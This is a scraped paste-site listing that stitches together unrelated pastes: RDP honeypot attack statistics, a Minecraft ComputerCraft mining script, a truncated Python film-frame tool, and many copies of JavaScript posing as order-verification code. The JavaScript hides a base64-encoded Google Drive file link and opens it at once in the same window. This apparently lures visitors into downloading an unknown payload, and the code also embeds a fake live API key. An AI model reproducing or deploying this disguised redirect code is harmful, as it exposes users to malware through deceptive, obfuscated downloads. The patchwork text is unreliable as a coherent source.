        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MqJgLwWB,2025-04-10_stats.json,rdp_snitch,JSON,Thursday 10th of April 2025 07:18:34 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 37950,
    ""150.95.30.49"": 15723,
    ""106.14.144.233"": 426,
    ""45.156.128.81"": 18,
    ""194.165.16.167"": 6,
    ""91.238.181.92"": 6,
    ""159.89.6.147"": 1440,
    ""92.255.85.92"": 6,
    ""198.235.24.65"": 9,
    ""157.245.104.150"": 3,
    ""62.60.188.24"": 6,
    ""68.183.179.179"": 483,
    ""103.97.93.115"": 18,
    ""205.210.31.64"": 9,
    ""58.218.199.219"": 15,
    ""80.66.79.30"": 288,
    ""45.227.254.132"": 9,
    ""198.235.24.124"": 9,
    ""178.128.98.159"": 288,
    ""152.32.198.210"": 3,
    ""194.165.16.165"": 6,
    ""118.194.248.4"": 3,
    ""88.214.25.125"": 6,
    ""42.96.5.120"": 3,
    ""198.235.24.44"": 9,
    ""167.94.138.197"": 3
  },
  ""asn"": {
    ""AS60068"": 37950,
    ""AS135161"": 15723,
    ""AS37963"": 426,
    ""AS211680"": 18,
    ""AS48721"": 12,
    ""AS49434"": 6,
    ""AS14061"": 2214,
    ""AS207566"": 6,
    ""AS396982"": 36,
    ""AS215930"": 6,
    ""AS134053"": 18,
    ""AS4134"": 15,
    ""AS60602"": 288,
    ""AS267784"": 9,
    ""AS135377"": 6,
    ""AS35042"": 6,
    ""AS135967"": 3,
    ""AS398324"": 3
  },
  ""isp"": {
    ""DataCamp Limited"": 37950,
    ""GMO-Z.COM PTE. LTD."": 15723,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""NSEC - Sistemas Informaticos, S.A."": 18,
    ""Flyservers S.A."": 21,
    ""Datacenter location PAR1 France"": 6,
    ""DigitalOcean, LLC"": 2214,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Google LLC"": 36,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 18,
    ""Chinanet"": 15,
    ""HYPER-HOSTING"": 288,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Bach Kim Network solutions Join stock company"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""Cdn77 SGP"": 37950,
    ""Zcom Thai"": 15723,
    ""Aliyun Computing Co., LTD"": 426,
    ""Inap AMS"": 18,
    ""Flyservers S.A"": 12,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""DigitalOcean, LLC"": 1926,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""UAB Host Baltic"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 18,
    ""Chinanet JS"": 15,
    ""Hyper Hosting SRL"": 288,
    ""Xwin Universal LTD"": 9,
    ""Digitalocean"": 288,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Ucloud Information Technology"": 3,
    ""Bach Kim Network solutions Join stock company"": 3,
    ""Censys, Inc"": 3
  },
  ""regionName"": {
    ""North West"": 37950,
    ""Bangkok"": 15723,
    ""Shanghai"": 426,
    ""North Holland"": 18,
    ""Kaunas"": 12,
    ""\u00cele-de-France"": 6,
    ""Hesse"": 1440,
    ""Moscow"": 6,
    ""California"": 36,
    ""Karnataka"": 3,
    ""Tehran"": 6,
    ""South West"": 771,
    ""Goa"": 18,
    ""Jiangsu"": 15,
    ""Chi\u0219in\u0103u Municipality"": 288,
    ""Vilnius"": 9,
    ""England"": 3,
    ""Seoul"": 3,
    ""Kowloon City"": 6,
    ""Ninh B\u00ecnh Province"": 3,
    ""Michigan"": 3
  },
  ""country"": {
    ""Singapore"": 38721,
    ""Thailand"": 15723,
    ""China"": 441,
    ""The Netherlands"": 18,
    ""Lithuania"": 21,
    ""France"": 6,
    ""Germany"": 1440,
    ""Russia"": 6,
    ""United States"": 39,
    ""India"": 21,
    ""Iran"": 6,
    ""Moldova"": 288,
    ""United Kingdom"": 3,
    ""South Korea"": 3,
    ""Hong Kong"": 6,
    ""Vietnam"": 3
  },
  ""account"": {
    ""hello"": 56640,
    ""root"": 18,
    ""Test"": 30,
    ""zSCdDLSbZ"": 3,
    ""LELAHv"": 3,
    ""xbwkyr"": 3,
    ""pwKvdUkzE"": 3,
    ""KfuJpr"": 3,
    ""mcdEUt"": 3,
    ""Domain"": 9,
    ""yGZehTPig"": 3,
    ""TDYeOH"": 3,
    ""tDDRoc"": 3,
    ""Administrator"": 6,
    ""(empty)"": 6,
    ""mdTDPyiAf"": 3,
    ""mrusIT"": 3,
    ""btIOmt"": 3
  },
  ""keyboard"": {
    ""Unknown"": 56745
  },
  ""client_build"": {
    ""Unknown"": 56745
  },
  ""client_name"": {
    ""Unknown"": 56745
  },
  ""ip_type"": {
    ""hosting & proxy"": 38379,
    ""hosting"": 18270,
    ""proxy"": 39,
    ""Unknown"": 57
  }
}"
GNGZ7hEe,2025-04-10_stats.json,rdp_snitch,JSON,Thursday 10th of April 2025 07:16:23 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 25300,
    ""150.95.30.49"": 10482,
    ""106.14.144.233"": 284,
    ""45.156.128.81"": 12,
    ""194.165.16.167"": 4,
    ""91.238.181.92"": 4,
    ""159.89.6.147"": 960,
    ""92.255.85.92"": 4,
    ""198.235.24.65"": 6,
    ""157.245.104.150"": 2,
    ""62.60.188.24"": 4,
    ""68.183.179.179"": 322,
    ""103.97.93.115"": 12,
    ""205.210.31.64"": 6,
    ""58.218.199.219"": 10,
    ""80.66.79.30"": 192,
    ""45.227.254.132"": 6,
    ""198.235.24.124"": 6,
    ""178.128.98.159"": 192,
    ""152.32.198.210"": 2,
    ""194.165.16.165"": 4,
    ""118.194.248.4"": 2,
    ""88.214.25.125"": 4,
    ""42.96.5.120"": 2,
    ""198.235.24.44"": 6,
    ""167.94.138.197"": 2
  },
  ""asn"": {
    ""AS60068"": 25300,
    ""AS135161"": 10482,
    ""AS37963"": 284,
    ""AS211680"": 12,
    ""AS48721"": 8,
    ""AS49434"": 4,
    ""AS14061"": 1476,
    ""AS207566"": 4,
    ""AS396982"": 24,
    ""AS215930"": 4,
    ""AS134053"": 12,
    ""AS4134"": 10,
    ""AS60602"": 192,
    ""AS267784"": 6,
    ""AS135377"": 4,
    ""AS35042"": 4,
    ""AS135967"": 2,
    ""AS398324"": 2
  },
  ""isp"": {
    ""DataCamp Limited"": 25300,
    ""GMO-Z.COM PTE. LTD."": 10482,
    ""Hangzhou Alibaba Advertising Co"": 284,
    ""NSEC - Sistemas Informaticos, S.A."": 12,
    ""Flyservers S.A."": 14,
    ""Datacenter location PAR1 France"": 4,
    ""DigitalOcean, LLC"": 1476,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Google LLC"": 24,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 4,
    ""Ethernet Xpress Pvt. Ltd."": 12,
    ""Chinanet"": 10,
    ""HYPER-HOSTING"": 192,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""NOC EMAIL: noc@one-host.net"": 4,
    ""Bach Kim Network solutions Join stock company"": 2,
    ""Censys, Inc."": 2
  },
  ""org"": {
    ""Cdn77 SGP"": 25300,
    ""Zcom Thai"": 10482,
    ""Aliyun Computing Co., LTD"": 284,
    ""Inap AMS"": 12,
    ""Flyservers S.A"": 8,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""DigitalOcean, LLC"": 1284,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Palo Alto Networks, Inc"": 24,
    ""UAB Host Baltic"": 4,
    ""Ethernet Xpress Pvt. Ltd."": 12,
    ""Chinanet JS"": 10,
    ""Hyper Hosting SRL"": 192,
    ""Xwin Universal LTD"": 6,
    ""Digitalocean"": 192,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Ucloud Information Technology"": 2,
    ""Bach Kim Network solutions Join stock company"": 2,
    ""Censys, Inc"": 2
  },
  ""regionName"": {
    ""North West"": 25300,
    ""Bangkok"": 10482,
    ""Shanghai"": 284,
    ""North Holland"": 12,
    ""Kaunas"": 8,
    ""\u00cele-de-France"": 4,
    ""Hesse"": 960,
    ""Moscow"": 4,
    ""California"": 24,
    ""Karnataka"": 2,
    ""Tehran"": 4,
    ""South West"": 514,
    ""Goa"": 12,
    ""Jiangsu"": 10,
    ""Chi\u0219in\u0103u Municipality"": 192,
    ""Vilnius"": 6,
    ""England"": 2,
    ""Seoul"": 2,
    ""Kowloon City"": 4,
    ""Ninh B\u00ecnh Province"": 2,
    ""Michigan"": 2
  },
  ""country"": {
    ""Singapore"": 25814,
    ""Thailand"": 10482,
    ""China"": 294,
    ""The Netherlands"": 12,
    ""Lithuania"": 14,
    ""France"": 4,
    ""Germany"": 960,
    ""Russia"": 4,
    ""United States"": 26,
    ""India"": 14,
    ""Iran"": 4,
    ""Moldova"": 192,
    ""United Kingdom"": 2,
    ""South Korea"": 2,
    ""Hong Kong"": 4,
    ""Vietnam"": 2
  },
  ""account"": {
    ""hello"": 37760,
    ""root"": 12,
    ""Test"": 20,
    ""zSCdDLSbZ"": 2,
    ""LELAHv"": 2,
    ""xbwkyr"": 2,
    ""pwKvdUkzE"": 2,
    ""KfuJpr"": 2,
    ""mcdEUt"": 2,
    ""Domain"": 6,
    ""yGZehTPig"": 2,
    ""TDYeOH"": 2,
    ""tDDRoc"": 2,
    ""Administrator"": 4,
    ""(empty)"": 4,
    ""mdTDPyiAf"": 2,
    ""mrusIT"": 2,
    ""btIOmt"": 2
  },
  ""keyboard"": {
    ""Unknown"": 37830
  },
  ""client_build"": {
    ""Unknown"": 37830
  },
  ""client_name"": {
    ""Unknown"": 37830
  },
  ""ip_type"": {
    ""hosting & proxy"": 25586,
    ""hosting"": 12180,
    ""proxy"": 26,
    ""Unknown"": 38
  }
}"
kMTy9kGF,2025-04-10_stats.json,rdp_snitch,JSON,Thursday 10th of April 2025 07:15:11 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 12650,
    ""150.95.30.49"": 5241,
    ""106.14.144.233"": 142,
    ""45.156.128.81"": 6,
    ""194.165.16.167"": 2,
    ""91.238.181.92"": 2,
    ""159.89.6.147"": 480,
    ""92.255.85.92"": 2,
    ""198.235.24.65"": 3,
    ""157.245.104.150"": 1,
    ""62.60.188.24"": 2,
    ""68.183.179.179"": 161,
    ""103.97.93.115"": 6,
    ""205.210.31.64"": 3,
    ""58.218.199.219"": 5,
    ""80.66.79.30"": 96,
    ""45.227.254.132"": 3,
    ""198.235.24.124"": 3,
    ""178.128.98.159"": 96,
    ""152.32.198.210"": 1,
    ""194.165.16.165"": 2,
    ""118.194.248.4"": 1,
    ""88.214.25.125"": 2,
    ""42.96.5.120"": 1,
    ""198.235.24.44"": 3,
    ""167.94.138.197"": 1
  },
  ""asn"": {
    ""AS60068"": 12650,
    ""AS135161"": 5241,
    ""AS37963"": 142,
    ""AS211680"": 6,
    ""AS48721"": 4,
    ""AS49434"": 2,
    ""AS14061"": 738,
    ""AS207566"": 2,
    ""AS396982"": 12,
    ""AS215930"": 2,
    ""AS134053"": 6,
    ""AS4134"": 5,
    ""AS60602"": 96,
    ""AS267784"": 3,
    ""AS135377"": 2,
    ""AS35042"": 2,
    ""AS135967"": 1,
    ""AS398324"": 1
  },
  ""isp"": {
    ""DataCamp Limited"": 12650,
    ""GMO-Z.COM PTE. LTD."": 5241,
    ""Hangzhou Alibaba Advertising Co"": 142,
    ""NSEC - Sistemas Informaticos, S.A."": 6,
    ""Flyservers S.A."": 7,
    ""Datacenter location PAR1 France"": 2,
    ""DigitalOcean, LLC"": 738,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Google LLC"": 12,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 2,
    ""Ethernet Xpress Pvt. Ltd."": 6,
    ""Chinanet"": 5,
    ""HYPER-HOSTING"": 96,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""NOC EMAIL: noc@one-host.net"": 2,
    ""Bach Kim Network solutions Join stock company"": 1,
    ""Censys, Inc."": 1
  },
  ""org"": {
    ""Cdn77 SGP"": 12650,
    ""Zcom Thai"": 5241,
    ""Aliyun Computing Co., LTD"": 142,
    ""Inap AMS"": 6,
    ""Flyservers S.A"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""DigitalOcean, LLC"": 642,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""UAB Host Baltic"": 2,
    ""Ethernet Xpress Pvt. Ltd."": 6,
    ""Chinanet JS"": 5,
    ""Hyper Hosting SRL"": 96,
    ""Xwin Universal LTD"": 3,
    ""Digitalocean"": 96,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Ucloud Information Technology"": 1,
    ""Bach Kim Network solutions Join stock company"": 1,
    ""Censys, Inc"": 1
  },
  ""regionName"": {
    ""North West"": 12650,
    ""Bangkok"": 5241,
    ""Shanghai"": 142,
    ""North Holland"": 6,
    ""Kaunas"": 4,
    ""\u00cele-de-France"": 2,
    ""Hesse"": 480,
    ""Moscow"": 2,
    ""California"": 12,
    ""Karnataka"": 1,
    ""Tehran"": 2,
    ""South West"": 257,
    ""Goa"": 6,
    ""Jiangsu"": 5,
    ""Chi\u0219in\u0103u Municipality"": 96,
    ""Vilnius"": 3,
    ""England"": 1,
    ""Seoul"": 1,
    ""Kowloon City"": 2,
    ""Ninh B\u00ecnh Province"": 1,
    ""Michigan"": 1
  },
  ""country"": {
    ""Singapore"": 12907,
    ""Thailand"": 5241,
    ""China"": 147,
    ""The Netherlands"": 6,
    ""Lithuania"": 7,
    ""France"": 2,
    ""Germany"": 480,
    ""Russia"": 2,
    ""United States"": 13,
    ""India"": 7,
    ""Iran"": 2,
    ""Moldova"": 96,
    ""United Kingdom"": 1,
    ""South Korea"": 1,
    ""Hong Kong"": 2,
    ""Vietnam"": 1
  },
  ""account"": {
    ""hello"": 18880,
    ""root"": 6,
    ""Test"": 10,
    ""zSCdDLSbZ"": 1,
    ""LELAHv"": 1,
    ""xbwkyr"": 1,
    ""pwKvdUkzE"": 1,
    ""KfuJpr"": 1,
    ""mcdEUt"": 1,
    ""Domain"": 3,
    ""yGZehTPig"": 1,
    ""TDYeOH"": 1,
    ""tDDRoc"": 1,
    ""Administrator"": 2,
    ""(empty)"": 2,
    ""mdTDPyiAf"": 1,
    ""mrusIT"": 1,
    ""btIOmt"": 1
  },
  ""keyboard"": {
    ""Unknown"": 18915
  },
  ""client_build"": {
    ""Unknown"": 18915
  },
  ""client_name"": {
    ""Unknown"": 18915
  },
  ""ip_type"": {
    ""hosting & proxy"": 12793,
    ""hosting"": 6090,
    ""proxy"": 13,
    ""Unknown"": 19
  }
}"
mJvc8nN7,Order.js,WassupDog45,JavaScript,Thursday 10th of April 2025 07:05:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/53734/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VrpR6hUG,Market.js,WassupDog45,JavaScript,Thursday 10th of April 2025 06:50:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24512/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JQudCfnB,Untitled,WassupDog45,JavaScript,Thursday 10th of April 2025 06:35:05 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10084/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
RdYBw2E1,Products.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 06:19:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/57686/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zQCzukP5,Chunk Eater,ZGAMMAA,Lua,Thursday 10th of April 2025 06:09:31 PM CDT,"-- ‚úÖ FINAL CHUNK EATER: Mines 16x16, returns to start to unload/refuel

-- === CONFIG ===
local CHUNK_SIZE = 16
local LAYER_HEIGHT = 3
local FUEL_BUFFER = 100

-- === POSITION TRACKING ===
local x, y, z = 0, 0, 0
local dir = 1 -- 0=north, 1=east, 2=south, 3=west
local startX, startY, startZ, startDir = x, y, z, dir

-- === DIRECTION HELPERS ===
local function turnRight() turtle.turnRight(); dir = (dir + 1) % 4 end
local function turnLeft() turtle.turnLeft(); dir = (dir - 1) % 4 end
local function face(target) while dir ~= target do turnRight() end end
local function faceExact(targetDir) while dir ~= targetDir do turnRight() end end
local function updatePosition(dx, dy, dz) x, y, z = x + dx, y + dy, z + dz end

-- === INVENTORY CHECK ===
local function isFull()
  for i = 1, 16 do
    if turtle.getItemCount(i) == 0 then return false end
  end
  return true
end

-- === GO TO COORDINATES ===
local function goTo(xT, yT, zT)
  while y < yT do turtle.down(); updatePosition(0, 1, 0) end
  while y > yT do turtle.up(); updatePosition(0, -1, 0) end

  face(1) while x < xT do turtle.forward(); updatePosition(1, 0, 0) end
  face(3) while x > xT do turtle.forward(); updatePosition(-1, 0, 0) end

  face(2) while z < zT do turtle.forward(); updatePosition(0, 0, 1) end
  face(0) while z > zT do turtle.forward(); updatePosition(0, 0, -1) end
end

-- === RETURN TO START AND UNLOAD BEHIND ===
local function returnToStartAndUnload()
  print(""üì¶ Returning to original start point to dump items..."")

  goTo(startX, startY, startZ)
  faceExact(startDir)

  -- Dump behind
  turnLeft(); turnLeft()
  for i = 1, 16 do
    turtle.select(i)
    turtle.drop()
  end
  turnLeft(); turnLeft()

  print(""‚úÖ Dump complete. Returning to work..."")
end

-- === REFUELING ===
local function refuelFromInventory()
  for i = 1, 16 do
    turtle.select(i)
    if turtle.refuel(0) then
      turtle.refuel()
      return true
    end
  end
  return false
end

local function checkFuel()
  local estReturn = math.abs(x - startX) + math.abs(y - startY) + math.abs(z - startZ) + FUEL_BUFFER
  if turtle.getFuelLevel() < estReturn then
    local sx, sy, sz, sd = x, y, z, dir
    print(""‚ö†Ô∏è Low fuel. Returning to refuel..."")
    returnToStartAndUnload()
    while not refuelFromInventory() do
      print(""‚åõ Waiting for fuel in inventory..."")
      sleep(2)
    end
    goTo(sx, sy, sz)
    faceExact(sd)
  end
end

-- === MOVEMENT ===
local function tryForward()
  if isFull() then
    print(""üì¶ Inventory full before move. Returning to dump..."")
    local sx, sy, sz, sd = x, y, z, dir
    returnToStartAndUnload()
    checkFuel()
    goTo(sx, sy, sz)
    faceExact(sd)
  end

  checkFuel()
  while not turtle.forward() do
    turtle.dig()
    sleep(0.3)
  end
  turtle.digUp()
  turtle.digDown()
  if dir == 0 then updatePosition(0, 0, -1)
  elseif dir == 1 then updatePosition(1, 0, 0)
  elseif dir == 2 then updatePosition(0, 0, 1)
  elseif dir == 3 then updatePosition(-1, 0, 0)
  end
end

local function tryUp()
  checkFuel()
  while not turtle.up() do
    turtle.digUp()
    sleep(0.3)
  end
  updatePosition(0, -1, 0)
end

local function tryDown()
  checkFuel()
  while not turtle.down() do
    turtle.digDown()
    sleep(0.3)
  end
  updatePosition(0, 1, 0)
end

-- === DIG LAYER ===
local function digLayer()
  for row = 1, CHUNK_SIZE do
    for col = 1, CHUNK_SIZE - 1 do
      tryForward()
    end
    if row < CHUNK_SIZE then
      if row % 2 == 1 then
        turnRight(); tryForward(); turnRight()
      else
        turnLeft(); tryForward(); turnLeft()
      end
    end
  end

  -- Return to origin column
  if x > 0 then face(3) while x > 0 do turtle.forward(); updatePosition(-1, 0, 0) end end
  if x < 0 then face(1) while x < 0 do turtle.forward(); updatePosition(1, 0, 0) end end
  if z > 0 then face(0) while z > 0 do turtle.forward(); updatePosition(0, 0, -1) end end
  if z < 0 then face(2) while z < 0 do turtle.forward(); updatePosition(0, 0, 1) end end
  face(1)
end

-- === MAIN ===
startX, startY, startZ, startDir = x, y, z, dir

print(""Enter depth to dig:"")
local depth = tonumber(read())
if not depth or depth <= 0 then
  print(""‚ùå Invalid depth."")
  return
end

for layer = 1, depth, LAYER_HEIGHT do
  digLayer()
  if layer + LAYER_HEIGHT <= depth then
    print(""‚¨áÔ∏è Descending to next layer..."")
    for i = 1, LAYER_HEIGHT do tryDown() end
  end
end

returnToStartAndUnload()
print(""‚úÖ Chunk excavation complete. Turtle returned to start."")
"
UA8mreJH,Order.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 06:04:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/87985/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UspgqgW8,Market.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 05:48:47 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/82092/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UbDVUK9K,pyGUI_CineFrameSaver,creativesamurai1982,Python,Thursday 10th of April 2025 05:41:34 PM CDT,"import cv2
import numpy as np
import os
import threading
import time
import tkinter as tk
from tkinter import ttk, Frame, Label, Canvas, Spinbox, messagebox, filedialog, Scrollbar
from PIL import Image, ImageTk
import imghdr

# =============================================================================
# Global Settings and Variables
# =============================================================================
DEBUG_MODE = True  # Toggle debugging messages

def debug_print(message):
    """"""Print debugging messages if DEBUG_MODE is enabled.""""""
    if DEBUG_MODE:
        print(message)

debug_print(""üîç DEBUG ENABLED"")

# Global state variables and configuration
image_display = None         # Tkinter image for current preview display
processed_image = None       # Processed image used for display
latest_image_path = None     # Latest loaded image (currently unused)
lock = threading.Lock()      # For thread safety
debounce_time = 0            # Timestamp for debouncing slider changes
display_mode = None          # Tkinter StringVar for display mode selection
threshold_value = 205        # Default threshold for image processing

frame_counter = 1            # Frame counter (used for unique filenames)
processed_count = 0          # Total count of processed strips
image_queue = []             # List of image file paths to process
update_pending = False       # Flag indicating if preview update is underway
update_requested = False     # Flag to queue a preview update if one is already running
stop_requested = False       # Flag to signal a processing stop

# Adjustable cropping parameters
frame_x_offset = 50          # Horizontal offset for cropped frames
frame_y_offset = 250         # Vertical offset for cropped frames
frame_width_max = 850        # Maximum width for cropped frames
frame_height_max = 1700       # Maximum height for cropped frames

# Folder paths (to be set in the GUI)
input_folder = """"
output_folder = """"

# Global variables for dialogs and overlays
loading_window = None        # The modal processing dialog
loading_label = None         # The overlay label for preview updates

# =============================================================================
# Image Processing Functions
# =============================================================================
def load_image(image_path):
    """"""
    Loads and validates an image from the given path.
    Returns:
        numpy.ndarray: Loaded image, or None if loading fails.
    """"""
    try:
        debug_print(f""üîç Attempting to load image: {image_path}"")
        formatted_path = os.path.normpath(image_path)
        debug_print(f""üîÑ Reformatted path: {formatted_path}"")
        
        if not os.path.exists(formatted_path):
            debug_print(f""‚ùå File does not exist: {formatted_path}"")
            return None
        
        time.sleep(1)  # Pause to ensure file writing is complete
        
        file_type = imghdr.what(formatted_path)
        if file_type not in ['jpeg', 'png']:
            debug_print(f""‚ùå Unsupported file type: {file_type}"")
            return None
        
        debug_print(f""‚úÖ Validated file type: {file_type}"")
        image = cv2.imread(formatted_path)
        if image is None:
            debug_print(f""‚ùå Failed to load image: {formatted_path}"")
        else:
            debug_print(f""‚úÖ Image loaded with shape: {image.shape}"")
        return image

    except cv2.error as e:
        debug_print(f""‚ùå OpenCV error in load_image: {e}"")
        return None
    except Exception as e:
        debug_print(f""‚ùå Unexpected error in load_image: {e}"")
        return None

def detect_and_crop_frames(image_path):
    """"""
    Detects sprocket holes and calculates cropping areas.
    Skips the first cropped frame (which is assumed to be unwanted).
